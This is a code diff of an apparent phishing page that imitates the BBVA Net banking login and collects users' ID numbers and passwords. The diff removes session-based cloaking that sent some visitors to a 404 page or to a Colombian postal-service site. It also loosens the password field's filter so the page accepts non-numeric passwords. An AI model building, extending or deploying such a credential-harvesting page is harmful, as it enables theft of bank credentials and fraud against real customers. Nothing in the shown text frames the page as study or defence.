@@ -1,18 +1,5 @@
 <?php
-session_start();
 
-
-if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
-
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
-
-    header('location:/404.php');
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){
-
-    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
-}
 ?>
 
 <!DOCTYPE html>
@@ -50,7 +37,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
     </select><br>
 
   <input type="tel" id="txtUsuario" name="userC" placeholder="Número de documento" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
-    <input type="password" name="pass" id="txtPass" placeholder="Contraseña"oninput="this.value = this.value.replace(/\D+/g, '');"><br>
+    <input type="password" name="pass" id="txtPass" placeholder="Contraseña" oninput="this.value = this.value.replace(/\s+/g, '')"><br>
     <input type="submit" value="Entrar a BBVA Net" id="btnUsuario" style="background-color:#227aba; font-size:17px; border:none;  font-weight: bold; color:white; width:85%;"><br>
 	<input type="hidden" value="bbva" id="banco">
    
